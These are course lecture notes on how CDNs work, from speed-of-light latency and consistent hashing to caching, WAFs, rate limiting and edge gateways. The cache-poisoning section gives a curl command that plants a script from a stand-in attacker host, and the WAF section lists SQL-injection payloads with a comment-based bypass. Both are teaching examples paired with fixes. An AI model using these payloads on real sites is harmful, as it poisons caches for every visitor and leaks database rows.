# Session 6 — (Ab)using CDNs 🌍

> **Topics:** The speed-of-light budget · What a CDN actually is · Consistent hashing · Anycast
> · `cf-cache-status` · SSI / ESI / Ajax / Railgun · Cache poisoning & deception · BBR ·
> Connection pooling · Request collapsing & tiered cache · WAF · Rate limiting · DDoS · API
> gateway · Workers · What you hand over
>
> 📄 Source: *CN at Scaler — Lesson 6*, "(Ab)using CDNs — someone else's computers, closer to
> your users".

```bash
$ curl -s https://www.cloudflare.com/cdn-cgi/trace | grep colo
colo=BOM        # you just found out which building answered you
```

> Weeks 1–5 made **one origin** fast. Today we put **a network** in front of it.

---

## 📑 Table of Contents

1. [The speed of light is the one number you cannot optimise](#-the-speed-of-light-is-the-one-number-you-cannot-optimise)
2. [Distance charges you twice: latency and loss](#-distance-charges-you-twice-latency-and-loss)
3. [What the edge actually buys back](#-what-the-edge-actually-buys-back)
4. [A CDN is Session 4's reverse proxy, rented in 300+ cities](#-a-cdn-is-session-4s-reverse-proxy-rented-in-300-cities)
5. [The founding algorithm: consistent hashing](#-the-founding-algorithm-consistent-hashing)
6. [The players — and the software you already know](#-the-players--and-the-software-you-already-know)
7. [Anycast: one address, 330+ cities](#-anycast-one-address-330-cities)
8. [By default a CDN caches by file extension](#-by-default-a-cdn-caches-by-file-extension)
9. [`cf-cache-status` is a small language](#-cf-cache-status-is-a-small-language)
10. [Caching the uncacheable: SSI, ESI, Ajax, Railgun](#-caching-the-uncacheable-ssi-esi-ajax-railgun)
11. [ESI, measured](#-esi-measured)
12. [Delta compression came back as a standard](#-delta-compression-came-back-as-a-standard)
13. [Cache poisoning and cache deception](#-cache-poisoning-and-cache-deception)
14. [BBR at the edge](#-bbr-at-the-edge)
15. [Connection pooling to the origin](#-connection-pooling-to-the-origin)
16. [Request collapsing and tiered cache](#-request-collapsing-and-tiered-cache)
17. [Everything that isn't speed](#-everything-that-isnt-speed)
18. [A WAF is a denylist of spellings](#-a-waf-is-a-denylist-of-spellings)
19. ["100 per 10 seconds" has five different meanings](#-100-per-10-seconds-has-five-different-meanings)
20. [DDoS — the one thing you cannot do yourself](#-ddos--the-one-thing-you-cannot-do-yourself)
21. [The edge as API gateway](#-the-edge-as-api-gateway)
22. [Run it now, no account](#-run-it-now-no-account)
23. [Workers — Session 3's question, answered again](#-workers--session-3s-question-answered-again)
24. [The bill: what you hand over](#-the-bill-what-you-hand-over)
25. [Key Terms Recap](#-key-terms-recap)
26. [Session Takeaways](#-session-takeaways)

---

## ⚡ The speed of light is the one number you cannot optimise

```text
light in vacuum    299,792 km/s
light in fibre     204,218 km/s      # glass slows it to ~2/3 (index 1.468)
                 = 4.90 ms per 1000 km, one way
```

| **10 ms** | **126 ms** | **47%** |
|---|---|---|
| Mumbai ↔ Chennai and back, in perfect straight glass. Measured ping: **23 ms**. | Mumbai ↔ Ashburn (`us-east-1`) and back. ⚠️ **You cannot go under this. Ever.** | faster if the glass were **hollow**. Microsoft is deploying hollow-core fibre now — ⚠️ but it is **not on your path today**. |

> ⭐ **A round trip to Virginia costs 126 ms before a single byte of yours is processed.** TLS
> 1.3 needs **three** of those round trips to first byte. That is **~380 ms of nothing**, and
> **no faster CPU touches it.**

> 💡 **The teaching version:** bandwidth is a pipe you can widen by paying. Latency is a
> distance you can only shorten by **moving**. That sentence is the entire CDN industry.

---

## 📉 Distance charges you twice: latency and loss

From an Akamai edge, 2010:

| | RTT | loss | throughput | 4 GB download |
|---|---|---|---|---|
| local, < 100 mi | **1.6 ms** | 0.6% | **44 Mbps** | 12 min |
| regional, 500–1,000 mi | 16 ms | 0.7% | 4 Mbps | 2.2 hrs |
| cross-continent, ~3,000 mi | 48 ms | 1.0% | 1 Mbps | 8.2 hrs |
| multi-continent, ~6,000 mi | **96 ms** | 1.4% | **0.4 Mbps** | **20 hrs** |

```
Throughput  ≈  MSS / (RTT × √loss)         — Mathis et al., 1997
```

> ⭐ A single TCP flow's ceiling falls **with RTT** *and* **with the square root of loss** — and
> long paths have more of both. **The far edge is 110× slower, not 60× further.**

💡 Session 5's HTTP/2 multiplexing and [BBR](#-bbr-at-the-edge) both exist to claw back
**this exact loss**.

---

## 🧮 What the edge actually buys back

```
you ──10 ms──▶ edge (Mumbai) ──194 ms──▶ origin (Washington)
```

| Scenario | Content | TTFB | vs direct |
|---|---|---|---|
| direct to origin, new connection | dynamic | **621 ms** | 3.0 RTT |
| direct to origin, connection kept alive | dynamic | 208 ms | 1.0 RTT |
| edge with **no** origin pool (just a longer proxy) | dynamic | ⚠️ **625 ms** | 3.1 RTT |
| edge, **warm origin pool**, new user connection | dynamic | 233 ms | 1.1 RTT |
| edge, warm pool, connection kept alive | dynamic | 209 ms | ≈ direct |
| **edge, cache HIT** (origin never touched) | static | **34 ms** | 0.2 RTT |
| edge, cache HIT, connection kept alive | static | ⭐ **11 ms** | 0.1 RTT |

> ⚠️ **A cache miss through the edge is no faster than going direct — sometimes slower.**
> ⭐ **The edge earns its place two ways:** it keeps **warm connections** to your origin
> (saving handshakes), and when it can **cache**, it **deletes the origin round trip entirely**
> (194 ms → 0).

---

## 🏢 A CDN is Session 4's reverse proxy, rented in 300+ cities

```
you ──10 ms, nearby──▶  edge PoP  ──one long, controlled leg──▶  shield /      your
                   (cache · TLS · WAF)                        tiered cache  →  origin
```

| **Nothing here is new** | **What geography adds** |
|---|---|
| the reverse proxy is **nginx** — Session 4 | the edge is **near the user**, so the 3-RTT handshake is cheap |
| caching is **`proxy_cache`** — Session 4 | the origin leg is long, but **the CDN owns both ends of it** — its own transport, its own pooling |
| the pool is **upstream keepalive** — Session 3 | a **shield / tiered-cache** layer means many edges share **one** origin fetch, not N |
| **anycast** puts one IP in every city — Session 2's addressing | **one anycast address**, announced from every city at once |

> ⭐ **Squid did reverse-proxy caching in 1996. A CDN is this, multiplied by geography and sold
> as a service.**

---

## 🔑 The founding algorithm: consistent hashing

**Which cache holds which URL?** Get this wrong and **every upgrade is a cold cache**.

```text
100,000 URLs, 10 caches → add an 11th

scheme                              URLs that move    busiest vs mean
hash(url) % N                            90.9%            1.02×
consistent hash, 1 point/server           3.3%            2.93×
consistent hash, 160 points/server        8.2%            1.14×
```

| **Modulo hashing is a trap** | **Consistent hashing (Karger et al., 1997)** |
|---|---|
| ⚠️ Add one server and `hash(url) % N` moves **~90% of URLs** to a different cache. **A capacity upgrade becomes a near-total cache flush — and a stampede on your origin at the worst moment.** | ⭐ Only the new server's **fair share** moves — ~1/11. **Virtual points** even out the load. |

> 💡 **This paper is what Akamai was founded on.** nginx ships it as
> `hash $request_uri consistent;` — 160 points per server, ketama-compatible.

> ⭐ **The same idea recurs all week: choosing an owner without a central registry** — DHTs,
> sharded caches, this. **Add capacity without moving the world.**

---

## 🏷️ The players — and the software you already know

| CDN | Born | Runs on / notable for | You met it in |
|---|---|---|---|
| **Akamai** | 1998 | own *"ghost"* edge servers; **ESI** (2001); FastTCP → BBR | consistent hashing |
| **Amazon CloudFront** | 2008 | AWS edge; **BBR to viewers since 2019** (+22%) | S2 congestion |
| **Fastly** | 2011 | a heavily-modified **Varnish** + H2O; **instant purge** | S3/S4 Varnish |
| **Google (Media CDN)** | 2022 | YouTube's edge, opened up; **QUIC/BBR everywhere** | S5 QUIC · BBR |
| **Broadpeak** | — | operator/telco CDN for streaming; on GKE too | S8 next week |
| **Cloudflare** | 2010 | was **nginx+LuaJIT** (FL1) → **Rust/Oxy** (FL2, 2025) | S4 nginx · Pingora |

> ⭐ **The software layer is Sessions 3 & 4.** Apache · HAProxy · Varnish · nginx — the reverse
> proxies from the scaling week — are what most CDNs were **built on**.
> **Fastly is Varnish. Cloudflare was nginx, and outgrew it:** the customer edge went
> nginx+LuaJIT → Rust on Oxy (Oct 2025, −10 ms, +25%), and the origin-facing proxy went to
> **Pingora** in 2022. ⭐ The same *"outgrow your proxy"* story the last two sessions left as a
> thread.

---

## 📡 Anycast: one address, 330+ cities

```bash
$ curl -s cloudflare.com/cdn-cgi/trace
ip=203.0.113.9
colo=BOM                    # Mumbai (IATA airport code)
http=http/1.1  tls=TLSv1.3
kex=X25519MLKEM768          # post-quantum

$ dig +short CHAOS TXT id.server @1.1.1.1
"BOM"                       # which 1.1.1.1 resolver answered?
```

**`colo` is an airport code:** BOM Mumbai · DEL Delhi · MAA Chennai · SIN Singapore ·
LHR London · IAD Ashburn. ⭐ It is **the CDN telling you which of its buildings your packets
reached — chosen by BGP anycast, not by you.**

💡 **The same trick is in every response:** `cf-ray: 8c1a…-BOM` — the suffix is the colo. That
is how you debug *"why is this user slow / stale"*.

> ⭐ **Run it on the classroom wifi, then from mobile data. Same domain, same IP, different
> colo.** That is anycast — Session 2's addressing, put to work.

---

## 🗂️ By default a CDN caches by file extension

| **What Cloudflare caches with no config** | **The cache key is the question** |
|---|---|
| **68 static extensions**: `css js png jpg webp woff mp4 pdf zip …` | **Default key = scheme + host + path + query.** |
| ⚠️ **NOT cached:** HTML, JSON, or anything with `Set-Cookie`, or `Cache-Control: private / no-store / no-cache / max-age=0` | ⚠️ **Everything else — cookies, most headers — is NOT in the key. Two users with different cookies share one cached object.** |
| Default edge TTL when the origin is silent: **200/301 → 2 hrs · 404 → 3 min · others: not cached** | ⭐ That is correct for `app.css` and **catastrophic for `/account`**. `Vary:` or a custom key is how you say *"these differ"* — Session 5's `Vary`, at the edge. |

```bash
$ curl -sI edge/static/app.css | grep -i x-cache
x-cache: MISS       # first visitor pays the origin round trip
x-cache: HIT        # everyone after is free — origin never touched

$ curl -sI edge/page/home | grep -i x-cache
x-cache: DYNAMIC    # HTML: not an eligible extension, straight to origin
```

---

## 🚦 `cf-cache-status` is a small language

| Status | What happened | Origin hit? | Your callback |
|---|---|---|---|
| **MISS** | eligible, not in cache — fetched from origin | yes | — |
| **HIT** | served from cache, still fresh | **no** | ⭐ the whole point |
| **EXPIRED** | was cached, TTL passed, re-fetched | yes | — |
| **REVALIDATED** | TTL passed, origin said **304** — cache reused | cheap 304 | S5 ETag / `If-None-Match` |
| **UPDATING** | stale served **now**, refresh in background | async | S4 `proxy_cache_use_stale` |
| **STALE** | ⭐ origin is **down** — serve stale anyway | failed | S7: failing gracefully |
| **DYNAMIC** | not eligible — **never looked in cache** | yes | the default for HTML |
| **BYPASS** | eligible, but origin said `no-store` | yes | S5 `Cache-Control` |

> ⭐ **One header, eight states.** `REVALIDATED` is Session 5's conditional request saving
> bandwidth; **`STALE` is next week's whole topic — the cache is the last thing standing when
> the origin dies.**

---

## 🧩 Caching the uncacheable: SSI, ESI, Ajax, Railgun

Pages got **personal**. Four tricks to cache them anyway.

| | | |
|---|---|---|
| **SSI** — Server-Side Includes | NCSA HTTPd 1.0a1, **1994** | Holes in an HTML file, filled **by the server** before sending. ⭐ **Predates CGI.** nginx still ships it. |
| **ESI** — Edge-Side Includes | Akamai + Oracle, W3C Note **2001** | The same holes, filled **at the EDGE**. Cache the shared shell everywhere; assemble per-user at the PoP. |
| **Ajax** | ~2005 | Push the holes all the way to **the browser**. Cache the body on the CDN; fetch the personal bits async. |
| **Railgun** — delta to origin | Cloudflare **2013–2024** | Give up on caching the dynamic page; send only the **BYTES that changed** since last time. |

> ⭐ **One arc: move the personalisation outward — server → edge → browser — so the big shared
> part can be cached, and only the small personal part is ever recomputed. Each step shrinks
> what the origin has to do.**

---

## 📐 ESI, measured

```html
<!-- the origin sends ONE shell, cacheable by everyone, with two holes -->
<header><esi:include src="/fragment/user"/> <esi:include src="/fragment/cart"/></header>

Cache-Control: s-maxage=300
Surrogate-Control: content="ESI/1.0"
```

```text
100 logged-in users; pages identical per user (39,676 B each)

                              origin reqs   origin→edge bytes   bytes to users   edge cache
A — origin assembles              100          3,984,200          3,992,400      DYNAMIC ×100
B — ESI, edge assembles           201             83,454          3,994,793      HIT ×99, MISS ×1
```

> ⭐ **Read the trade carefully.** Origin **bytes** fell **98%** (the shell is fetched once, not
> 100 times). ⚠️ **Bytes to the user are unchanged — ESI does not shrink the download.** And
> ⚠️ **origin *requests* went UP** (100 → 201), because each personal fragment is its own tiny
> fetch.
> **You move load off the origin's page-rendering onto the edge's assembly. Whether that wins
> depends on which is your bottleneck.**

---

## 🗜️ Delta compression came back as a standard

```text
a ~24 KB news page, regenerated every minute

                                              bytes   % of raw
gzip -6 (no dictionary)                        4,276    17.7%
deflate, dict = page 1 min ago                   598     2.5%
zstd,    dict = page 1 min ago (dcz)             436     1.8%
zstd,    dict = page 1 HOUR ago                1,277     5.3%
```

| **Railgun (Cloudflare, 2013–2024)** | **RFC 9842 — Compression Dictionary Transport (Sep 2025)** |
|---|---|
| A daemon inside your origin + a sender at the edge kept the **last version of each page on both ends**, and sent only the delta. *"Caching down to the individual bytes."* **Retired Jan 2024** — the network got fast enough, and a standard arrived. | ⭐ The same idea, standardised, **browser ↔ server**: the version you **already have** becomes the dictionary for the next one. `Available-Dictionary: <sha-256>` · `Content-Encoding: dcb / dcz` |

> ⭐ **A one-minute-old copy turns 24 KB into 436 bytes — ~10× past gzip.** ⚠️ **The catch:**
> the dictionary must be **recent and identical on both ends**, which is exactly what Railgun
> kept and what RFC 9842 names by hash.

> 💡 This is Session 5's *"why not gzip the headers"* again — **dictionaries leak**, so it is
> same-origin, HTTPS-only, hashed.

---

## ☠️ Cache poisoning and cache deception

```bash
$ curl -H 'X-Forwarded-Host: evil.example' edge/page/landing    # ONE attacker request
<script src="https://evil.example/app.js"></script>

$ curl edge/page/landing                                        # every visitor, next 60 s
<script src="https://evil.example/app.js"></script>   x-cache: HIT
```

| **Cache poisoning (Kettle, 2018)** | **Cache deception (Gil, 2017)** |
|---|---|
| The origin **reflects a header** (`X-Forwarded-Host`) into the page. ⚠️ **That header is NOT in the cache key.** One malicious request caches a hostile page; **everyone else is served it**. | Trick the victim into loading `/account/settings/fake.css`. The edge sees `.css`, **caches the response — which contained the victim's private page**. The attacker then fetches the same URL from the cache. |
| **Fix:** drop the unkeyed header at the edge, add it to the key, or `Vary` on it. | **Fix:** don't cache by extension alone; honour the origin's content-type and `no-store`. |

> ⭐ **Both bugs are the cache key disagreeing with reality** — the same root as the
> personalisation problem, **turned into an exploit**. **A cache is shared state, and shared
> state is an attack surface.**

---

## 📈 BBR at the edge

**Loss-based (CUBIC):** fill the pipe until a packet drops, then halve — **the sawtooth**.
⚠️ On long, lossy CDN paths **it mistakes distance for congestion**.

**BBR** (Cardwell et al., Google, 2016): measure the actual **bottleneck bandwidth** and the
**min RTT**, and **pace to that**. ⭐ **Loss is no longer the congestion signal.**

| Deployed | Who / where | Result |
|---|---|---|
| Google B4 + YouTube, 2016 | the paper | **2–25× CUBIC throughput**; median RTT **−53%** globally |
| Amazon CloudFront, 2019 | edge → viewer | up to **+22%** throughput; some US mobile **+100%** |
| Akamai, Nov 2019 | media delivery | BBR on **>80%** of end-user connections |
| measured across the web, 2023 | top-10k sites | **BBR is now the most-deployed CCA**; CUBIC ~7% |

> ⭐ **Only the sender changes — no new protocol, no client, no router.** That is why a CDN can
> just switch it on for you: **it owns the sender on the long leg back to your origin, and the
> one out to the user.**

---

## 🔗 Connection pooling to the origin

```text
300 visitors, edge→origin 50 ms, TLS 1.3, origin idle-close 1 s

edge configuration     origin reqs   new conns   reuse    mean TTFB
no pool                     300         300       0.0%      160 ms
32 worker pools             300         164      45.3%      112 ms
8 worker pools              300          52      82.7%       74 ms
1 shared pool               300           4      98.7%       57 ms
```

> ⭐ **Why the shared pool wins.** A pooled connection opened by **one worker** can only be
> reused by **that worker**. Split the pool across many workers and **each sees too few
> requests to keep its connections warm before the origin closes them.**
> This is **nginx's per-worker pool vs Pingora's shared pool** — Session 4's Cloudflare thread.

> 💡 **Pingora, in production:** moving from per-worker nginx pools to one shared pool took one
> big customer's reuse from **87.1% → 99.92%** — a **160× drop in new origin connections**, and
> ⭐ ***"434 years of handshake time saved every day."***

> ⭐ ***"Amortise the setup"*** **— Session 3's first closing idea — now spanning a continent.**
> The setup you're amortising is a **2-RTT TLS handshake to your origin**.

---

## 🧲 Request collapsing and tiered cache

| **Multiplexing to the origin** | **Tiered cache / origin shield** |
|---|---|
| HTTP/2 puts many streams on one connection. A CDN uses it on **both legs** — many user streams in, a few multiplexed streams back to origin. | ⚠️ **Without it:** 300 edges each MISS → **300 requests hit your origin for the same object**. A built-in thundering herd — Session 3 & 4's `cache_lock`, globally. |
| ⚠️ **But note the default:** most CDN→origin hops are **still HTTP/1.1**. `cloudflared`'s `http2Origin` defaults to **false**. **Pooling is what actually saves you there today.** | ⭐ **With it:** edges fetch from a **regional parent**; the parent fetches from origin **once**. Your origin sees **one** request, not 300. |

```text
request collapsing at one edge — 50 users, cold cache, 1 object

without collapsing    50 origin fetches    # every miss stampedes
with collapsing        1 origin fetch      # 49 wait for the first, then all HIT
```

> ⭐ **Collapsing (one PoP) and tiered cache (across PoPs) are the same move at two scales:
> never fetch the same object twice at once.** It is why a CDN **protects** your origin during
> a traffic spike instead of **amplifying** it.

---

## 🛡️ Everything that isn't speed

> *"All requests are coming to the CDN anyway…"*

| | |
|---|---|
| **WAF** | SQLi, XSS, path traversal — inspected **before your app sees them** |
| **Rate limiting** | cap requests per client, per path, **before they cost you anything** |
| **DDoS** | absorb a **31.4 Tbps** flood with capacity **you could never buy** |
| **API gateway** | authenticate, add/strip headers, route, fall back — **at the edge** |

> ⭐ **The biggest shift in what a CDN is: it started as a cache and became the security
> perimeter — because the perimeter is wherever all the traffic converges, and for you that is
> the edge.**
> ⚠️ **Speed got you to adopt it; control is why you can't leave.**

---

## 🧱 A WAF is a denylist of spellings

```text
q="' OR 1=1 --"           blocked by edge rule sqli-tautology
q="'/**/OR/**/1=1--"      ⚠️ 5 rows leak      # comments instead of spaces; regex misses

(edge --waf full, strips comments first)
q="'/**/OR/**/1=1--"      blocked             # normalisation caught it…
q="' --"                  ⚠️ 5 rows leak      # …but no OR, no UNION, no digits to match
```

| **The arms race is normalisation** | **So what is it FOR?** |
|---|---|
| A WAF matches **patterns in text**, so the game is **how much decoding it does first** (raw → URL-decode → strip comments → …) **vs how many ways the attacker can spell the same attack**. ⚠️ **You never win it outright.** | ⭐ **Buying time** and blocking the **mass-scanned, known payloads** (Log4Shell, the OWASP top patterns) — a real, useful layer. |

> ⭐ **The bug still lives in your origin. The actual fix is `bind parameters`.** Turn on safe
> queries and **every bypass returns "no results"**.

---

## 🚰 "100 per 10 seconds" has five different meanings

```text
limit 100 / 10 s

algorithm                  burst at the window edge    normal page load
fixed window               ⚠️ 200 in one second !!     all pass
sliding log (exact)             100                    all pass
sliding window (estimate)       104                    all pass
token bucket                    109                    all pass
leaky bucket, burst=0            10                    ⚠️ 97% refused !!
```

| **The two failure modes** | **Cloudflare's real answer (2017)** |
|---|---|
| ⚠️ **Fixed window:** 100 at 9.999 s + 100 at 10.001 s = **200 in a blink**. Cloudflare's free plan only offers this, 10 s. | ⭐ **The sliding-window estimate:** weight the previous window by how much still overlaps. **Two counters per client.** Measured across 400M requests: only **0.003%** wrongly allowed or blocked. **Cheap and close enough.** |
| ⚠️ **Leaky bucket with no burst:** mathematically pure, **refuses a real browser** that opens 30 requests at once. ⭐ Which is why nginx's `limit_req` has a **`burst`** parameter. | |

> ⚠️ **Counts are per data-center, not global** — a botnet spread across 330 cities gets **330
> budgets**. **The algorithm and the geography both matter.**

---

## 🌊 DDoS — the one thing you cannot do yourself

| **31.4 Tbps** | **auto** | **~500 Tbps** |
|---|---|---|
| largest DDoS on record (Cloudflare, Dec 2025). Aisuru botnet, **1–4M devices**. Lasted **35 seconds**. | mitigated **automatically, no human in the loop**. ⚠️ **You cannot buy 31 Tbps of inbound to soak this.** | Cloudflare's total network capacity across 330+ cities — **the pool the flood lands in**. |

> ⭐ **Why only a CDN can do this.** A volumetric flood is won with **more capacity than the
> attacker**, spread across **enough locations that anycast splits the flood across all of
> them** (Session 2). **Your origin has one pipe; the CDN has hundreds.** This is the purest
> case of *"rent capacity you could never own"* — and it is why sites move behind a CDN **the
> day after an attack, not before**.

> ⚠️ **The catch (Session 7 preview).** The flip side of **one network absorbing everyone's
> attacks** is **one network being everyone's single point of failure**. **June 2021: a Fastly
> config bug took 85% of its network to errors** — Reddit, Spotify, the UK government, gone at
> once. **Concentration cuts both ways.**

---

## 🔐 The edge as API gateway

```text
no token                401  edge: missing bearer token   # origin never sees it
valid JWT               {"user":"alice","orders":[…]}     # edge sets X-User
expired JWT             401  edge: expired
alg:none forgery        401  edge: alg 'none' refused     # never let the token pick
client sends X-User: admin   ignored — edge overwrites the identity it derived

attacker hits origin IP ⚠️ {"orders":[EVERYTHING]} !!     the edge is bypassed
```

> ⭐ **The gateway is only real if the origin can't be reached directly.** That last line is
> the whole point: **put auth at the edge and leave the origin open, and an attacker just skips
> the edge.**
> **The fix is mutual TLS (authenticated origin pulls) or a Tunnel** — the origin only answers
> clients holding the edge's certificate. Then the direct request gets *"connection reset"* and
> the edge still works.

💡 **Header hygiene too:** the origin leaks `X-Powered-By: PHP/5.4.45`; the edge **strips it**.

---

## 🧪 Run it now, no account

```bash
# 1 — which building answered you
curl -s https://www.cloudflare.com/cdn-cgi/trace | grep -E 'colo|tls|kex'

# 2 — anycast: one IP, which city?
dig +short CHAOS TXT id.server @1.1.1.1          # "BOM"

# 3 — the headers a CDN adds
curl -sI https://www.cloudflare.com/ | grep -iE 'cf-ray|cf-cache|age|alt-svc'

# 4 — physics: same handshake, Mumbai vs Virginia
curl -w 'tls %{time_appconnect}s\n' -so /dev/null \
     https://dynamodb.ap-south-1.amazonaws.com/ping     # vs us-east-1

# 5 — put YOUR laptop behind the edge
python3 echo_server.py 8000                       # terminal 1
cloudflared tunnel --url http://localhost:8000    # → https://<rand>.trycloudflare.com
```

> ⭐ **The quick-tunnel demo is the one to do together.** That random URL puts your laptop
> behind Cloudflare's edge **in seconds — no account, no DNS**. The echo server prints each
> request's `CF-Connecting-IP`, the `CF-Ray` with the visitor's colo, `CDN-Loop` — and
> **how few TCP connections `cloudflared` uses for the whole room** (that's the pool).
> ⚠️ Limits: 200 in-flight, no Server-Sent Events, testing only.

💡 Also worth opening: `radar.cloudflare.com` and `speed.cloudflare.com`.

**Free-plan dashboard demos** — and ⭐ **the limits are themselves the lesson**:

| Do this | The point | Free-plan limit |
|---|---|---|
| orange vs grey cloud | `dig` shows the origin IP **vanish behind anycast** | — |
| cache an HTML page | MISS → HIT → purge → MISS; `Age` climbs | 10 rules |
| block naive SQLi | **the same bypasses as the WAF demo** | 5 rules, **no regex** |
| rate-limit `/api/*` | ~20 pass then 429; **per-colo counts** | 1 rule, **10 s only** |
| strip `X-Powered-By` | header hygiene, **no code** | unlimited |
| deploy a Worker | your code at the edge | 100k req/day |

> ⭐ **1 WAF rule with no regex** is why the bypasses matter; a **10-second-only** rate window
> is exactly the fixed-window weakness; **HTML not cached until you add a Cache Rule** is the
> defaults slide. **The constraints teach the concepts.**

---

## ⚙️ Workers — Session 3's question, answered again

```js
export default {
  async fetch(request, env) {
    const { success } = await env.LIMITER.limit({ key: ip });     // rate limit
    const claims = await verifyJwt(token, env.JWT_SECRET);        // WebCrypto
    headers.set('X-User', claims.sub);
    return fetch(origin, { headers });                            // primary→backup
  }
}
```

> ⭐ **Session 3 asked: "isn't everything a web server?"** CGI forked a process per request;
> FastCGI kept them warm; nginx ran an event loop. **A Worker is the next answer: a V8
> isolate, not a process** — starts in **~5 ms, ~3 MB**, not the 35 MB + cold start of a
> container.

> ⭐ **Amortise the setup, one more time.** No fork+exec per request (Session 3's CGI cost); no
> VM to boot. **The runtime is already resident in every PoP; your code just runs in it.** It
> is prefork / FastCGI / servlets — the same closing idea — **taken to the edge**.

---

## 🧾 The bill: what you hand over

| | |
|---|---|
| **Your TLS private keys** | ⚠️ The edge **terminates HTTPS**, so it holds the keys (or its own cert for your domain). ⭐ **It can read every byte. That is the deal.** |
| **A single point of failure** | **Fastly, 8 Jun 2021:** one customer's config change → **85% of the network to errors**. Reddit, Spotify, gov.uk down. **49 minutes to recover.** |
| **The power to see and shape traffic** | **Domain fronting** used CDNs to hide censored traffic behind innocent domains — until **AWS, Google (2018) and Fastly (2024) all banned it**. ⭐ **Whoever runs the edge decides what flows.** |

---

## 📝 Key Terms Recap

| Term | Meaning |
|---|---|
| **PoP / colo** | A CDN point of presence; `colo=BOM` is the IATA code of the building that answered |
| **Anycast** | One IP announced from many cities; BGP picks the nearest |
| **Origin / edge / shield** | Your server / the nearby cache / the regional parent that fans in |
| **Consistent hashing** | ⭐ Add a server and only its fair share of keys move (vs ~90% for `% N`) |
| **Virtual points** | ~160 per server; evens out the load imbalance |
| **Mathis formula** | `throughput ≈ MSS / (RTT × √loss)` — distance charges twice |
| **`cf-cache-status`** | MISS · HIT · EXPIRED · REVALIDATED · UPDATING · **STALE** · DYNAMIC · BYPASS |
| **Cache key** | ⚠️ scheme + host + path + query by default — **cookies are not in it** |
| **SSI / ESI** | Holes filled by the server (1994) / **by the edge** (2001) |
| **Railgun / RFC 9842** | Delta-to-origin (2013–24) / standardised **compression dictionaries** (2025) |
| **Cache poisoning** | An unkeyed reflected header caches a hostile response for everyone |
| **Cache deception** | A fake `.css` suffix caches a victim's private page |
| **BBR** | Bandwidth × min-RTT pacing; **sender-only change**, now the most-deployed CCA |
| **Connection pool / Pingora** | ⭐ One **shared** pool beats N per-worker pools — 87.1% → 99.92% reuse |
| **Request collapsing** | One PoP: 50 concurrent misses → **1** origin fetch |
| **Tiered cache / origin shield** | Across PoPs: 300 edges → **1** origin fetch |
| **WAF** | Pattern denylist + normalisation; ⚠️ buys time, **does not fix the bug** |
| **Fixed / sliding / token / leaky** | Rate-limit algorithms — ⚠️ fixed window allows 2× at the boundary |
| **Authenticated origin pull / Tunnel** | ⭐ The thing that makes an edge gateway real |
| **Worker / V8 isolate** | ~5 ms, ~3 MB startup — the next answer to "run user code per request" |
| **Domain fronting** | Hiding traffic behind an innocent SNI; banned by every major CDN |

---

## 🎯 Session Takeaways

1. ⭐ **The speed of light is a fixed budget.** 126 ms Mumbai↔Virginia, and TLS 1.3 needs three of those. **No CPU helps. Only moving closer does.**
2. **Distance charges you twice** — latency *and* loss — and `MSS / (RTT × √loss)` means the far edge is **110× slower**, not merely further.
3. ⭐ **A cache MISS through the edge is not faster than going direct.** The edge wins by (a) keeping **warm origin connections** and (b) **deleting the origin round trip** when it can cache.
4. **A CDN is Session 4's nginx, rented in 300+ cities** — plus anycast, plus a shield tier.
5. ⭐ **Consistent hashing is the founding algorithm.** `hash % N` moves 90% of your keys when you add a server — **a capacity upgrade becomes a cache flush and an origin stampede**.
6. **By default a CDN caches by file extension, and cookies are not in the cache key.** Correct for `app.css`, catastrophic for `/account`.
7. ⭐ **Both classic cache attacks are the cache key disagreeing with reality.** A cache is **shared state, and shared state is an attack surface**.
8. **Personalisation moved outward: server (SSI) → edge (ESI) → browser (Ajax).** ESI cut origin *bytes* 98% but **raised origin *requests*** — know which is your bottleneck.
9. **BBR is a sender-only change**, which is exactly why a CDN can switch it on for you on both legs.
10. ⭐ **One shared origin pool beats N per-worker pools** — "434 years of handshake time saved every day". *Amortise the setup*, now spanning a continent.
11. ⭐ **Request collapsing and tiered cache are the same move at two scales: never fetch the same object twice at once.** It's why a CDN protects your origin instead of amplifying a spike.
12. **The CDN became the security perimeter because the perimeter is wherever all traffic converges.** Speed got you to adopt it; **control is why you can't leave**.
13. ⚠️ **A WAF is a denylist of spellings and you never win the normalisation race.** It buys time; **bind your parameters**.
14. ⚠️ **"100 per 10 seconds" has five meanings** — fixed window allows 200 at the boundary, and counts are **per data-centre, not global**.
15. **An edge API gateway is only real if the origin cannot be reached directly** — mTLS or a tunnel, or the attacker just skips it.
16. ⚠️ **The bill: your TLS keys, a shared single point of failure, and someone else deciding what flows.** Fastly took 85% of its network down in 2021 with a config change.

---

## 🔗 References

- Karger et al., *Consistent Hashing and Random Trees*, STOC 1997 — https://dl.acm.org/doi/10.1145/258533.258660
- Nygren, Sitaraman & Sun, *The Akamai Network*, ACM SIGOPS OSR 44(3), 2010
- Mathis et al., *The macroscopic behavior of the TCP congestion avoidance algorithm*, 1997
- Cardwell et al., *BBR: Congestion-Based Congestion Control*, ACM Queue 14(5), 2016 — https://queue.acm.org/detail.cfm?id=3022184
- Cloudflare, *How we built Pingora* — https://blog.cloudflare.com/how-we-built-pingora-the-proxy-that-connects-cloudflare-to-the-internet/
- Cloudflare, *Counting things, a lot of different things* (rate limiting) — https://blog.cloudflare.com/counting-things-a-lot-of-different-things/
- Cloudflare DDoS threat reports — https://blog.cloudflare.com/tag/ddos-reports/
- J. Kettle, *Practical Web Cache Poisoning*, 2018 — https://portswigger.net/research/practical-web-cache-poisoning
- O. Gil, *Web Cache Deception Attack*, Black Hat USA 2017
- ESI 1.0 — W3C Note, 2001 — https://www.w3.org/TR/esi-lang/
- RFC 9842 — Compression Dictionary Transport — https://www.rfc-editor.org/rfc/rfc9842
- Cloudflare cache docs — https://developers.cloudflare.com/cache/
- Cloudflare Workers — https://developers.cloudflare.com/workers/
- Fastly incident, 8 June 2021 — https://www.fastly.com/blog/summary-of-june-8-outage

---

## ➡️ Next

[Session 7 — Building for Failures](./07_Building_for_Failures.md) — we just concentrated
everything behind one network. **What happens when a piece of it fails?**
